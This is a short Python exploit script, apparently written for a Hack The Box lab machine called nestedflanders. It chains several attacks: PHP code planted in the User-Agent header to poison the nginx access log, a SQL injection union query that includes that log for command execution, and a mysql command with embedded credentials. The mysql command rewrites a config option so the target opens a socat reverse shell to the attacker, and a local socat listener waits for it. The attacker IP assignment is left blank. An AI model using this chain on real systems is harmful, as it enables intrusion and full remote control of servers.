import requests, urllib, socket, os

s = requests.Session()
s.get('https://www.nestedflanders.htb',verify=False)
ip= # ip-address
headers = {
    'Host': 'www.nestedflanders.htb',
    'User-Agent': 'Mozilla/5.0 <?php system($_GET[\'cmd\']); ?>',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'DNT': '1',
}

cmd = urllib.quote("""mysql -u 'nestedflanders' -p'1036913cf7d38d4ea4f79b050f171e9fbf3f5e' -e 'UPDATE neddy.config SET option_value = "socat exec:\\"bash -li\\",pty,stderr,setsid,sigint,sane tcp:{}:443" WHERE option_name = "checkrelease";'""".format(ip))
for i in range(1,3):
        r = s.get("""https://www.nestedflanders.htb/index.php?id=465'+union+all+select+"contact'+union+all+select+'/var/log/nginx/access.log"'&cmd={}""".format(cmd), headers=headers, verify=False, timeout=3)
        cmd = "sudo socat file:`tty`,raw,echo=0 tcp-listen:443"
        os.system(cmd)
